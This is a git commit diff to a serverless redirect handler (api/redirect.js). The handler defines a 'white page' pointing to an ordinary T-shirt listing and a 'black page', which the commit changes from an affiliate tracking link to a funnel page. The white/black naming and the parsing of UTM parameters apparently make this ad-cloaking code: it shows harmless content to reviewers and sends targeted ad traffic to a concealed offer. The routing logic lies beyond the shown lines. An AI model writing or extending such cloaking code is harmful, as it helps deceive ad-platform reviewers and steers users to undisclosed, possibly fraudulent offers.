1ab1f2f3cc61a3ebd23a4967e6e0d2f96a015e27
TalhaRai2017 <137892001+TalhaRai2017@users.noreply.github.com>
2025-01-09 03:15:15 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.zazzle.com/pd/spp/pt-zazzle_shirt?color=white&groups=%7Btoddlers%7D&size=2t&style=lat_toddler_tshirt_3321&subgroups=%7Btshirts%7D&design.shade=light&feature=%7Bbasic%7D&tags=%7Bshowswhite%2Ccompliancelabel%7D";
-    const blackPageURL = "https://glstrck.com/aff_c?offer_id=250&aff_id=27260";
+    const blackPageURL = "https://jshzuaudhsuay9231.myfunnelish.com/imbassd-1736240287466924";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
